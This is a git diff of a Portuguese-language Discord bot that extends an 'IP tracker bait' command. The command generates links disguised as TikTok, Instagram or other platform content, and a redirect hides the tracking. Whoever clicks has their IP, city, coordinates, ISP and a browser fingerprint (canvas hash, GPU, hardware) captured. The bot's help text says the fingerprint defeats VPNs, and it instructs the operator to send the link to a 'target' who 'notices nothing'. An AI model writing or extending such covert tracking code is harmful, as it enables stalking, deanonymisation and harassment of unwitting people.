@@ -499,8 +499,13 @@ const COMMANDS = [
     .setName("ipbait")
     .setDescription("🪤 IP Tracker Bait — gera link camuflado para capturar IP (owner/admin only)")
     .addStringOption(opt =>
+      opt.setName("url")
+        .setDescription("🔗 URL real de destino — o alvo clica e é redirecionado para ela (URL Masking)")
+        .setRequired(false)
+    )
+    .addStringOption(opt =>
       opt.setName("theme")
-        .setDescription("Aparência do link bait")
+        .setDescription("Aparência do link bait (tema visual da página de carregamento)")
         .setRequired(false)
         .addChoices(
           { name: "🎵 TikTok",      value: "tiktok"    },
@@ -2842,7 +2847,7 @@ async function handlePanel(interaction: ChatInputCommandInteraction): Promise<vo
       const res = await fetch(`${API_BASE}/api/tracker/${token}`);
       if (!res.ok) { await interaction.editReply({ embeds: [buildErrorEmbed("TOKEN INVÁLIDO", "Nenhum registro encontrado para este token.")] }); return; }
       const data = await res.json() as {
-        token: string; theme?: string;
+        token: string; theme?: string; redirectUrl?: string;
         userId?: string; username?: string; targetName?: string;
         generatedAt?: number;
         capturedIp?: string; capturedAt?: number; userAgent?: string;
@@ -2851,48 +2856,134 @@ async function handlePanel(interaction: ChatInputCommandInteraction): Promise<vo
         lat?: number; lon?: number;
         isProxy?: boolean; isVpn?: boolean; isTor?: boolean; isHosting?: boolean; mobile?: boolean;
         hits?: number;
+        fp_screenW?: number; fp_screenH?: number; fp_colorDepth?: number; fp_pixelRatio?: number;
+        fp_lang?: string; fp_langs?: string; fp_platform?: string;
+        fp_cores?: number; fp_memory?: number;
+        fp_connection?: string; fp_downlink?: number; fp_rtt?: number; fp_saveData?: boolean;
+        fp_tz?: string; fp_online?: boolean; fp_cookies?: boolean; fp_dnt?: string;
+        fp_touchPoints?: number; fp_localTime?: string;
+        fp_canvasHash?: string; fp_webglVendor?: string; fp_webglRenderer?: string;
       };
 
       const THEME_LABELS: Record<string, string> = {
         tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
         x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord", plain: "🔗 Direto",
       };
+      const FLAG_MAP: Record<string, string> = {
+        US:"🇺🇸",BR:"🇧🇷",GB:"🇬🇧",DE:"🇩🇪",FR:"🇫🇷",RU:"🇷🇺",CN:"🇨🇳",IN:"🇮🇳",
+        JP:"🇯🇵",KR:"🇰🇷",CA:"🇨🇦",AU:"🇦🇺",MX:"🇲🇽",AR:"🇦🇷",PT:"🇵🇹",ES:"🇪🇸",
+        IT:"🇮🇹",NL:"🇳🇱",PL:"🇵🇱",TR:"🇹🇷",UA:"🇺🇦",CL:"🇨🇱",CO:"🇨🇴",
+      };
 
-      const notCaptured = !data.capturedIp;
-      const embed = new EmbedBuilder()
-        .setColor(notCaptured ? COLORS.GOLD : COLORS.PURPLE)
-        .setTitle(notCaptured ? "⏳ IP TRACKER — AGUARDANDO CLIQUE" : "🎯 IP TRACKER — ALVO CAPTURADO")
+      const notCaptured  = !data.capturedIp;
+      const hasFp        = !!data.fp_screenW;
+      const isMasked     = !!data.redirectUrl;
+      const flag         = data.countryCode ? (FLAG_MAP[data.countryCode] ?? "🌐") : "🌐";
+      const locationStr  = [data.city, data.region, data.country].filter(Boolean).join(", ") || "N/A";
+      const vpnStatus    = (data.isProxy || data.isVpn) ? "🔒 VPN/Proxy detectado" : data.isTor ? "🧅 Tor detectado" : data.isHosting ? "☁️ Hosting/DC" : "✅ IP residencial";
+
+      // ── Embed 1: Status + Identidade ────────────────────────────────────────
+      const embed1 = new EmbedBuilder()
+        .setColor(notCaptured ? COLORS.GOLD : 0x9B59B6)
+        .setTitle(notCaptured ? "⏳ AGUARDANDO CLIQUE" : `🎯 ALVO CAPTURADO — ${flag} ${data.country ?? ""}`)
         .setDescription(
           notCaptured
-            ? `O link ainda não foi clicado.\n*Token:* \`${token}\``
-            : `*Token:* \`${token}\``
+            ? `O link ainda **não foi clicado**.\nFique de olho — assim que clicar, o Geass captura tudo.\n\n*Token:* \`${token}\``
+            : `*"O olho do Geass tudo vê. Nada escapa."*\n\n${isMasked ? "⚡ **URL Masking** — o alvo não percebeu nada." : ""}`
         )
         .addFields(
-          { name: "🎭 Tema", value: THEME_LABELS[data.theme ?? "tiktok"] ?? (data.theme ?? "N/A"), inline: true },
-          { name: "🎯 Alvo", value: data.targetName ? `\`${data.targetName}\`` : "N/A", inline: true },
-          { name: "📊 Hits", value: `\`${data.hits ?? 0}\``, inline: true },
-          { name: "📡 IP Capturado", value: data.capturedIp ? `\`${data.capturedIp}\`` : "⏳ Aguardando...", inline: true },
-          { name: "🌍 País", value: data.countryCode ? `${data.countryCode} — ${data.country ?? ""}` : "N/A", inline: true },
-          { name: "🏙️ Cidade", value: [data.city, data.region].filter(Boolean).join(", ") || "N/A", inline: true },
-          { name: "🏢 ISP", value: data.isp ?? "N/A", inline: true },
-          { name: "🏗️ ORG / ASN", value: [data.org, data.asn].filter(Boolean).join(" · ") || "N/A", inline: true },
-          { name: "🕐 Fuso horário", value: data.timezone ?? "N/A", inline: true },
-          { name: "🔒 Proxy/VPN", value: (data.isProxy || data.isVpn) ? "✅ SIM" : "❌ Não", inline: true },
-          { name: "🧅 Tor", value: data.isTor ? "✅ SIM" : "❌ Não", inline: true },
-          { name: "☁️ Hosting/DC", value: data.isHosting ? "✅ SIM" : "❌ Não", inline: true },
-          { name: "📱 Mobile", value: data.mobile ? "✅ Sim" : "❌ Não", inline: true },
-          { name: "🗺️ Coords", value: (data.lat && data.lon) ? `[${data.lat}, ${data.lon}](https://maps.google.com/?q=${data.lat},${data.lon})` : "N/A", inline: true },
-          { name: "🕑 Gerado em", value: data.generatedAt ? `<t:${Math.floor(data.generatedAt / 1000)}:R>` : "N/A", inline: true },
-          { name: "⚡ Capturado em", value: data.capturedAt ? `<t:${Math.floor(data.capturedAt / 1000)}:F>` : "⏳ N/A", inline: true },
+          { name: "🎭 Aparência usada",    value: THEME_LABELS[data.theme ?? "tiktok"] ?? (data.theme ?? "N/A"), inline: true },
+          { name: "🎯 Alvo registrado",    value: data.targetName ? `\`${data.targetName}\`` : "N/A",            inline: true },
+          { name: "📊 Total de cliques",   value: `\`${data.hits ?? 0}\``,                                        inline: true },
+          { name: "🕑 Bait gerado",        value: data.generatedAt ? `<t:${Math.floor(data.generatedAt / 1000)}:R>` : "N/A", inline: true },
+          { name: "⚡ IP capturado em",    value: data.capturedAt  ? `<t:${Math.floor(data.capturedAt  / 1000)}:F>` : "⏳ Aguardando", inline: true },
+          { name: "🔗 Destino mascarado",  value: isMasked ? `\`${(data.redirectUrl ?? "").slice(0, 60)}\`` : "*padrão da plataforma*", inline: false },
         )
         .setTimestamp()
-        .setFooter({ text: AUTHOR });
+        .setFooter({ text: `${AUTHOR} • Geass Intelligence — token: ${token.slice(0, 8)}...` });
 
-      if (data.userAgent) {
-        embed.addFields({ name: "🖥️ User-Agent", value: `\`\`\`${data.userAgent.slice(0, 200)}\`\`\``, inline: false });
+      if (notCaptured) {
+        await interaction.editReply({ embeds: [embed1] });
+        return;
       }
 
-      await interaction.editReply({ embeds: [embed] });
+      // ── Embed 2: Rede + Geolocalização ──────────────────────────────────────
+      const embed2 = new EmbedBuilder()
+        .setColor(0x3498DB)
+        .setTitle("📡 REDE & GEOLOCALIZAÇÃO")
+        .addFields(
+          { name: "📡 IP Capturado",    value: `\`${data.capturedIp}\``,                                                   inline: true  },
+          { name: "🌍 Localização",     value: `${flag} ${locationStr}`,                                                   inline: true  },
+          { name: "🕐 Fuso horário",    value: data.timezone ?? "N/A",                                                     inline: true  },
+          { name: "🏢 ISP",             value: data.isp      ?? "N/A",                                                     inline: true  },
+          { name: "🏗️ Organização",    value: data.org      ?? "N/A",                                                     inline: true  },
+          { name: "🔢 ASN",             value: data.asn      ?? "N/A",                                                     inline: true  },
+          { name: "🔒 Anonimato",       value: vpnStatus,                                                                  inline: true  },
+          { name: "📱 Mobile",          value: data.mobile ? "✅ Sim (dados móveis / WiFi móvel)" : "❌ Não",               inline: true  },
+          { name: "🗺️ Coordenadas",    value: (data.lat && data.lon) ? `[${data.lat}, ${data.lon}](https://maps.google.com/?q=${data.lat},${data.lon})` : "N/A", inline: false },
+        );
+
+      // ── Embed 3: Dispositivo ────────────────────────────────────────────────
+      const embed3 = new EmbedBuilder()
+        .setColor(0x2ECC71)
+        .setTitle("💻 DISPOSITIVO & NAVEGADOR");
+
+      if (hasFp) {
+        const screenStr      = `${data.fp_screenW ?? "?"}×${data.fp_screenH ?? "?"} — ${data.fp_colorDepth ?? "?"}bit cor — ${data.fp_pixelRatio ?? "?"}x pixel ratio`;
+        const langStr        = [data.fp_lang, data.fp_langs ? `(${data.fp_langs})` : null].filter(Boolean).join(" ");
+        const connStr        = [
+          data.fp_connection ?? null,
+          data.fp_downlink   != null ? `${data.fp_downlink} Mbps` : null,
+          data.fp_rtt        != null ? `${data.fp_rtt}ms RTT` : null,
+          data.fp_saveData   ? "economizando dados" : null,
+        ].filter(Boolean).join(" · ") || "N/A";
+        const hardwareStr    = [
+          data.fp_cores  != null ? `${data.fp_cores} núcleos CPU` : null,
+          data.fp_memory != null ? `${data.fp_memory}GB RAM` : null,
+        ].filter(Boolean).join(" · ") || "N/A";
+        const touchStr       = data.fp_touchPoints != null ? (data.fp_touchPoints > 0 ? `✅ Touch (${data.fp_touchPoints} pontos)` : "❌ Sem touch") : "N/A";
+        const privacyStr     = [
+          data.fp_cookies === false ? "🍪 Cookies bloqueados" : null,
+          data.fp_dnt === "1"       ? "🛑 DNT ativado" : null,
+          data.fp_online === false  ? "📴 Offline" : null,
+        ].filter(Boolean).join(" · ") || "✅ Normal";
+
+        embed3.addFields(
+          { name: "🖥️ Resolução / Tela",   value: screenStr,                    inline: false },
+          { name: "🌐 Idioma",              value: langStr || "N/A",             inline: true  },
+          { name: "💻 Plataforma",          value: data.fp_platform ?? "N/A",   inline: true  },
+          { name: "⚙️ Hardware",            value: hardwareStr,                  inline: true  },
+          { name: "📶 Conexão",             value: connStr,                      inline: true  },
+          { name: "👆 Toque",              value: touchStr,                     inline: true  },
+          { name: "🔐 Privacidade",         value: privacyStr,                   inline: true  },
+          { name: "🕐 Horário local (alvo)", value: data.fp_tz ? `\`${data.fp_tz}\`` + (data.fp_localTime ? ` — \`${data.fp_localTime.replace("T"," ").slice(0,19)}\`` : "") : "N/A", inline: false },
+        );
+      } else {
+        embed3.setDescription("⏳ Fingerprint do dispositivo ainda não recebido (o alvo pode ter bloqueado JS ou o beacon falhou).");
+      }
+
+      if (data.userAgent) {
+        embed3.addFields({ name: "🔍 User-Agent completo", value: `\`\`\`${data.userAgent.slice(0, 300)}\`\`\``, inline: false });
+      }
+
+      // ── Embed 4: Fingerprint técnico (canvas + WebGL) ───────────────────────
+      const embeds: import("discord.js").EmbedBuilder[] = [embed1, embed2, embed3];
+
+      if (hasFp && (data.fp_canvasHash || data.fp_webglVendor)) {
+        const embed4 = new EmbedBuilder()
+          .setColor(0xE74C3C)
+          .setTitle("🔬 FINGERPRINT TÉCNICO")
+          .setDescription("Dados de identificação única do navegador — resistentes a VPN e proxies.")
+          .addFields(
+            { name: "🎨 Canvas Hash",      value: data.fp_canvasHash    ? `\`${data.fp_canvasHash}\``    : "N/A", inline: true },
+            { name: "🎮 WebGL Vendor",     value: data.fp_webglVendor   ? `\`${data.fp_webglVendor}\``   : "N/A", inline: true },
+            { name: "🖥️ GPU Renderer",    value: data.fp_webglRenderer ? `\`${(data.fp_webglRenderer ?? "").slice(0, 60)}\`` : "N/A", inline: false },
+          )
+          .setFooter({ text: "Canvas hash + GPU identifica o dispositivo mesmo atrás de VPN/proxy" });
+        embeds.push(embed4);
+      }
+
+      await interaction.editReply({ embeds });
     } catch {
       await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Falha ao consultar o tracker.")] });
     }
@@ -2934,6 +3025,7 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
   const theme       = interaction.options.getString("theme")  ?? "tiktok";
   const targetUser  = interaction.options.getUser("target");
   const customLabel = interaction.options.getString("label");
+  const redirectUrl = interaction.options.getString("url")?.trim() ?? null;
 
   const targetName = customLabel
     ?? targetUser?.displayName
@@ -2953,6 +3045,20 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
     discord: "https://discord.com/app",
   };
 
+  // Validate redirect URL if provided
+  if (redirectUrl) {
+    try {
+      const u = new URL(redirectUrl);
+      if (u.protocol !== "https:" && u.protocol !== "http:") {
+        await interaction.editReply({ embeds: [buildErrorEmbed("URL INVÁLIDA", "A URL de destino deve começar com `https://` ou `http://`.")] });
+        return;
+      }
+    } catch {
+      await interaction.editReply({ embeds: [buildErrorEmbed("URL INVÁLIDA", "A URL fornecida não é válida. Exemplo: `https://youtube.com/watch?v=xxx`")] });
+      return;
+    }
+  }
+
   try {
     const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
       method: "POST",
@@ -2962,6 +3068,7 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
         username:   targetUser?.username ?? callerName,
         targetName,
         theme,
+        ...(redirectUrl ? { redirectUrl } : {}),
       }),
     });
 
@@ -2970,22 +3077,32 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
       return;
     }
 
-    const { token, url } = await trackerRes.json() as { token: string; url: string; theme: string };
-    const themeLabel   = THEME_LABELS[theme] ?? theme.toUpperCase();
-    const themeRedirect = THEME_REDIRECT[theme] ?? "https://discord.com/app";
+    const genData = await trackerRes.json() as { token: string; url: string; theme: string; redirectUrl?: string };
+    const { token, url } = genData;
+    const themeLabel    = THEME_LABELS[theme] ?? theme.toUpperCase();
+    const effectiveDest = genData.redirectUrl ?? THEME_REDIRECT[theme] ?? "https://discord.com/app";
+    const isMasked      = !!genData.redirectUrl;
 
     const embed = new EmbedBuilder()
-      .setColor(COLORS.PURPLE)
-      .setTitle(`🪤 IP TRACKER BAIT — ${themeLabel}`)
-      .setDescription(`*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`)
+      .setColor(isMasked ? 0x00C851 : COLORS.PURPLE)
+      .setTitle(isMasked ? `🪤 URL MASKING ATIVO — ${themeLabel}` : `🪤 IP TRACKER BAIT — ${themeLabel}`)
+      .setDescription(
+        isMasked
+          ? `*"O link parece inocente, mas o Geass já abriu seu olho."*\n\n⚡ **URL Masking:** o alvo clica achando que é um link normal — IP capturado antes do redirecionamento.`
+          : `*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`
+      )
       .addFields(
         {
-          name: "🎭 Tema / Aparência",
+          name: "🎭 Aparência do Link",
           value: [
-            `**Plataforma:** ${themeLabel}`,
-            `**Convence como:** Conteúdo real de ${themeLabel} — link orgânico`,
-            `**Redireciona para:** ${themeRedirect}`,
+            `**Visual:** ${themeLabel} — tela de carregamento convincente`,
+            `**Parece ser:** Conteúdo orgânico de ${themeLabel}`,
           ].join("\n"),
+          inline: false,
+        },
+        {
+          name: isMasked ? "🎯 Destino Real (oculto)" : "🔀 Redireciona para",
+          value: `\`${effectiveDest.length > 80 ? effectiveDest.slice(0, 77) + "..." : effectiveDest}\``,
           inline: false,
         },
         {
@@ -2996,17 +3113,17 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
           inline: false,
         },
         {
-          name: "🔗 Link Camuflado",
+          name: "🔗 Link Camuflado — Envie este",
           value: url,
           inline: false,
         },
         {
-          name: "🔑 Token de Rastreio",
+          name: "🔑 Token",
           value: `\`${token}\``,
           inline: true,
         },
         {
-          name: "⏱️ Gerado em",
+          name: "⏱️ Gerado",
           value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
           inline: true,
         },
@@ -3017,12 +3134,20 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
         },
         {
           name: "ℹ️ Como funciona",
-          value: [
-            "1️⃣ Envie o link ao alvo (WhatsApp, DM, chat)",
-            "2️⃣ Ao clicar, o IP, localização, ISP e dispositivo são capturados instantaneamente",
-            "3️⃣ Use `/panel ipcheck` com o token para ver os dados capturados",
-            "4️⃣ O link redireciona automaticamente após 1.8s — parece legítimo",
-          ].join("\n"),
+          value: isMasked
+            ? [
+                "1️⃣ Envie o **link camuflado** ao alvo (WhatsApp, DM, Insta, etc.)",
+                `2️⃣ O alvo clica achando ser um link de ${themeLabel}`,
+                "3️⃣ IP, geolocalização, ISP, dispositivo e fingerprint são capturados",
+                `4️⃣ Redireciona automaticamente para o link real — o alvo não percebe nada`,
+                "5️⃣ Use `/panel ipcheck` para ver todos os dados capturados",
+              ].join("\n")
+            : [
+                "1️⃣ Envie o link ao alvo (WhatsApp, DM, chat)",
+                "2️⃣ Ao clicar, IP, localização, ISP e fingerprint são capturados",
+                "3️⃣ O link redireciona para a plataforma original — parece legítimo",
+                "4️⃣ Use `/panel ipcheck` com o token para ver os dados capturados",
+              ].join("\n"),
           inline: false,
         },
       )
